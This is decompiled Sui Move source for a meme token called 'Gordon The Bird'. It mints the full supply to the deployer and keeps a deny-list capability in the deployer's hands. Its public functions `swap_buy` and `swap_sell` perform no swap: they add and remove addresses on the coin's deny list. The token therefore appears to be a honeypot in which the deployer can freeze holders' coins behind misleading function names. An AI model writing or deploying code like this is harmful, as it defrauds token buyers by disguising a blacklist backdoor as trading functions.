module 0xdc402901842999c3ad47a974492ba9b83b6e04d6a6e51618d8373b9305d16c36::gordon {
    struct GORDON has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GORDON, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GORDON>(arg0, 9, b"GORDON", b"Gordon The Bird", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmcQ356Rm9xaUM4iXnLeavoQVi6Ku72QmAUG93CfgJBm2o"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GORDON>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GORDON>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GORDON>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GORDON>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GORDON>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GORDON>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GORDON>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<GORDON>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

